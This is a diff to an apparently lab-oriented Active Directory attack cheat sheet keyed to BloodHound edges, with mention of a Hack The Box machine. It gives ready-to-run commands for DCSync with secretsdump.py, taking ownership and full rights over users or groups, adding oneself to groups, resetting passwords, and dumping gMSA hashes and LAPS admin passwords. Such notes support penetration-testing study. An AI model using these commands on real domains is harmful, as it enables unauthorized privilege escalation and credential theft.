@@ -67,12 +67,18 @@ If the Link says WriteDacl and the abuse info says that we can do a dcsync attac
 And after that simply use secretsdump.py from impacket to get kerberos golden tickets of the accounts due to the nature of DCSync attack by using `secretsdump.py USERNAME:PASSWORD@DC IP`
 
 ### WriteOwner
-If the Link says WriteOwner then we can change the owner of that object and do various thing for one, we can reset the password of the user without knowing there current password and also many other things with the following cmdlets from the powerview script
+If the Link says WriteOwner then we can change the owner of that object and do various thing for one, we can reset the password of the user without knowing there current password, we can also add ourselves into a group if the target identity is a group and also many other things with the following cmdlets from the powerview script
 
 ```powershell
-Set-DomainObjectOwner -Identity "TARGET USER" -OwnerIdentity "OUR USER"
-Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights All
+Set-DomainObjectOwner -Identity "TARGET USER/TARGET GROUP" -OwnerIdentity "CURRENT USER"
+Add-DomainObjectAcl -TargetIdentity "TARGET USER/TARGET GROUP" -PrincipalIdentity "CURRENT USER" -Rights All
 ```
+
+#### For adding yourselves to a group
+```powershell
+Add-DomainGroupMember -Identity 'TARGET GROUP' -Members 'CURRENT USER' -Credential $Cred
+```
+
 #### For reset password
 ```powershell
 net user claire "SOME SECURE PASSWORD HERE" /domain
@@ -88,6 +94,11 @@ We can also reset the password using rpc by logging in to RPC with the account h
 ### ReadGMSAPassword
 
 If our owned user(AD object) has ReadGMSAPassword privelage for a GMSA(Group Managed Service Account), then usually its a high value target, due to as follows https://cube0x0.github.io/Relaying-for-gMSA/, so understanding this article, we see sometimes the GMSA is usually granted more rights than what it needs, hence it is in our best interest to own them. The article describes on how to do it if you have a shell with the account. But in intelligence from htb, we didnt have shell, so we used ldapsearch to gain info on it, using the following syntax `ldapsearch -x -b "DISTINGUISHED NAME OF THE TARGET GMSA RETRIEVED FROM BLOODHOUND" -H "ldap://DC IP" -D "DISTINGUISHED NAME OF THE OWNED ACCOUNT WHICH HAS THE RIGHTS" -w "PASSWORD OF THE OWNED ACCOUNT" "objectclass=*"`. and do get NT password hash we can use the gmsadump.py which can be found here https://github.com/micahvandeusen/gMSADumper, via the following command `python3 gmsadumper.py -u 'USERNAME' -p 'PASSWORD' -d <DOMAIN CONTROLLER DOMAIN NAME(NOT IP)>`.
+
+### ReadLAPSPassword
+
+If we have the ReadLAPSPassword edge we can get the local admin password of the machine using crackmapexec or other tools
+`crackmapexec ldap "TARGET IP/TARGET DOMAIN" -d "TARGET DOMAIN" -u "USERNAME" -p 'PASSWORD' --module laps`
 
 ### If we have DnsAdmin group
 
